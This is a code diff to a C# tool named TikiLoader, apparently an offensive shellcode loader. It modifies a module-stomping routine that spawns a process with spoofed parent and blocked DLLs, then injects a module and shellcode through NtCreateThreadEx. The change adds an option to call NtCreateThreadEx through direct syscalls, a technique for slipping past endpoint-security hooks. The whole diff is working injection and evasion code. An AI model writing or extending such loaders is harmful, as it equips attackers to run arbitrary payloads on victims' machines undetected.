@@ -17,8 +17,12 @@ namespace TikiLoader
         public int ParentId { get; set; } = 0;
         public bool BlockDlls { get; set; } = false;
 
-        public void Stomp(byte[] shellcode)
+        private bool _syscalls;
+
+        public void Stomp(byte[] shellcode, bool useSyscalls = false)
         {
+            _syscalls = useSyscalls;
+            
             var pi = Utilities.SpawnProcess(BinaryPath, WorkingDirectory, BlockDlls, ParentId);
 
             if (!LoadModule(pi))
@@ -96,18 +100,37 @@ namespace TikiLoader
 
             // Load DLL into process
             var hThread = IntPtr.Zero;
-            Native.NtCreateThreadEx(
-                ref hThread,
-                Data.Win32.WinNT.ACCESS_MASK.MAXIMUM_ALLOWED,
-                IntPtr.Zero,
-                pi.hProcess,//process.Handle,
-                allocShim,
-                allocModule,
-                false,
-                0,
-                0,
-                0,
-                IntPtr.Zero);
+
+            if (_syscalls)
+            {
+                Syscall.NtCreateThreadEx(
+                    ref hThread,
+                    Data.Win32.WinNT.ACCESS_MASK.MAXIMUM_ALLOWED,
+                    IntPtr.Zero,
+                    pi.hProcess,
+                    allocShim,
+                    allocModule,
+                    false,
+                    0,
+                    0,
+                    0,
+                    IntPtr.Zero);
+            }
+            else
+            {
+                Native.NtCreateThreadEx(
+                    ref hThread,
+                    Data.Win32.WinNT.ACCESS_MASK.MAXIMUM_ALLOWED,
+                    IntPtr.Zero,
+                    pi.hProcess,
+                    allocShim,
+                    allocModule,
+                    false,
+                    0,
+                    0,
+                    0,
+                    IntPtr.Zero);
+            }
 
             // Wait for thread
             Win32.WaitForSingleObject(hThread, Data.Win32.WinNT.INFINITE);
@@ -174,23 +197,42 @@ namespace TikiLoader
             Marshal.FreeHGlobal(buffer);
 
             var hThread = IntPtr.Zero;
-            Native.NtCreateThreadEx(
-                ref hThread,
-                Data.Win32.WinNT.ACCESS_MASK.MAXIMUM_ALLOWED,
-                IntPtr.Zero,
-                process.Handle,
-                targetAddress,
-                IntPtr.Zero,
-                false,
-                0,
-                0,
-                0,
-                IntPtr.Zero);
+
+            if (_syscalls)
+            {
+                Syscall.NtCreateThreadEx(
+                    ref hThread,
+                    Data.Win32.WinNT.ACCESS_MASK.MAXIMUM_ALLOWED,
+                    IntPtr.Zero,
+                    process.Handle,
+                    targetAddress,
+                    IntPtr.Zero,
+                    false,
+                    0,
+                    0,
+                    0,
+                    IntPtr.Zero);
+            }
+            else
+            {
+                Native.NtCreateThreadEx(
+                    ref hThread,
+                    Data.Win32.WinNT.ACCESS_MASK.MAXIMUM_ALLOWED,
+                    IntPtr.Zero,
+                    process.Handle,
+                    targetAddress,
+                    IntPtr.Zero,
+                    false,
+                    0,
+                    0,
+                    0,
+                    IntPtr.Zero);
+            }
 
             return hThread != IntPtr.Zero;
         }
 
-        private byte[] GenerateShim(long loadLibraryExP)
+        private static byte[] GenerateShim(long loadLibraryExP)
         {
             using var ms = new MemoryStream();
             using var bw = new BinaryWriter(ms);
